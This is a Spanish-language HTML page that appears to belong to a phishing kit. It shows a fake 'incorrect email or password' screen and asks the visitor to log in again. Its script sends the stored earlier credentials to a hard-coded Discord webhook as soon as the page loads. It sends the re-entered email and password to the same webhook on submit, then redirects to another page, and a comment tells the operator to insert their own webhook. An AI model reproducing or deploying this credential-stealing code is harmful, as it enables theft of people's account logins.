<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación Incorrecta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .banner {
            background-color: #f8f9fa;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo-space {
            width: 120px;
            height: 120px;
            background-color: #e9ecef;
            border-radius: 10px;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed #dee2e6;
        }

        .logo-space img {
            max-width: 100%;
            max-height: 100%;
        }

        .error-message {
            color: #dc3545;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .error-description {
            color: #dc3545;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
        }

        input::placeholder {
            color: #adb5bd;
        }

        .error {
            color: #dc3545;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background-color: #0056b3;
        }

        button:active {
            background-color: #004085;
        }

        .loading {
            display: none;
            text-align: center;
            color: #007bff;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="banner">
        <!-- Espacio para el logo -->
        <div class="logo-space">
            <img id="logo" src="logo.png" alt="Logo">
        </div>

        <div class="error-message">❌ Error de Validación</div>
        <div class="error-description">
            Correo o Contraseña incorrecto<br>
            Vuelve a intentarlo
        </div>

        <form id="reintentarForm">
            <!-- Campo de Correo Electrónico -->
            <div class="form-group">
                <label for="email">Correo Electrónico</label>
                <input 
                    type="email" 
                    id="email" 
                    placeholder="ejemplo@correo.com" 
                    required
                >
                <div class="error" id="emailError">El correo debe contener un @</div>
            </div>

            <!-- Campo de Contraseña -->
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input 
                    type="password" 
                    id="password" 
                    placeholder="Ingresa tu contraseña" 
                    required
                >
            </div>

            <!-- Botón Continuar -->
            <button type="submit">Continuar</button>

            <div class="loading" id="loading">Enviando datos...</div>
        </form>
    </div>

    <script>
        // REEMPLAZA ESTO CON TU WEBHOOK DE DISCORD
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1556173985086177380/0-QwH4IDZEOB8-_lIbuhh8thRbKeDbUvm_gFU2sADsHdVoUNU7RTNXAKckazKRTwv4Qp';

        const form = document.getElementById('reintentarForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('emailError');
        const loadingDiv = document.getElementById('loading');

        // Obtener datos anteriores del localStorage para mostrar en Discord el fallo
        const emailAnterior = localStorage.getItem('userEmail');
        const passwordAnterior = localStorage.getItem('userPassword');

        // Enviar a Discord - FALLO DE VALIDACIÓN (se envía al cargar esta página)
        async function enviarDiscordFallo() {
            try {
                const message = {
                    content: `❌ **Fallo de Validación**`,
                    embeds: [
                        {
                            color: 15158332, // Rojo
                            title: "Fallo de Validación de Acceso",
                            fields: [
                                {
                                    name: "📧 Correo Electrónico",
                                    value: emailAnterior || "No disponible",
                                    inline: true
                                },
                                {
                                    name: "🔑 Contraseña",
                                    value: "||" + (passwordAnterior || "No disponible") + "||",
                                    inline: true
                                },
                                {
                                    name: "❌ Estado",
                                    value: "Correo o Contraseña Incorrecto",
                                    inline: false
                                },
                                {
                                    name: "⏰ Fecha y Hora",
                                    value: new Date().toLocaleString('es-ES'),
                                    inline: false
                                }
                            ],
                            footer: {
                                text: "Sistema de Validación - Fallo"
                            }
                        }
                    ]
                };

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });

                console.log('Fallo de validación enviado a Discord');
            } catch (error) {
                console.error('Error al enviar a Discord:', error);
            }
        }

        // Enviar el fallo cuando cargue la página
        window.addEventListener('load', () => {
            enviarDiscordFallo();
        });

        // Validar correo
        function validateEmail(email) {
            return email.includes('@') && email.includes('.');
        }

        // Validar en tiempo real
        emailInput.addEventListener('blur', () => {
            if (emailInput.value && !validateEmail(emailInput.value)) {
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
            }
        });

        // Manejar envío del formulario (reintentos)
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = emailInput.value;
            const password = passwordInput.value;

            // Validar correo
            emailError.style.display = validateEmail(email) ? 'none' : 'block';

            if (!validateEmail(email) || !password) {
                return;
            }

            loadingDiv.style.display = 'block';

            // Enviar a Discord - REINTENTO DE LOGIN
            try {
                const message = {
                    content: `🔄 **Reintento de Login**`,
                    embeds: [
                        {
                            color: 16776960, // Amarillo
                            title: "Reintento de Validación de Acceso",
                            fields: [
                                {
                                    name: "📧 Correo Electrónico",
                                    value: email,
                                    inline: true
                                },
                                {
                                    name: "🔑 Contraseña",
                                    value: "||" + password + "||",
                                    inline: true
                                },
                                {
                                    name: "🔄 Tipo",
                                    value: "Reintento después de fallo",
                                    inline: false
                                },
                                {
                                    name: "⏰ Fecha y Hora",
                                    value: new Date().toLocaleString('es-ES'),
                                    inline: false
                                }
                            ],
                            footer: {
                                text: "Sistema de Validación - Reintento"
                            }
                        }
                    ]
                };

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });

                console.log('Reintento enviado a Discord');
            } catch (error) {
                console.error('Error al enviar a Discord:', error);
            }

            // Guardar datos en localStorage y redirigir
            localStorage.setItem('userEmail', email);
            localStorage.setItem('userPassword', password);

            // Redirigir a la página de carga después de 1 segundo
            setTimeout(() => {
                loadingDiv.style.display = 'none';
                window.location.href = 'foto.html';
            }, 1000);
        });
    </script>
</body>
</html>
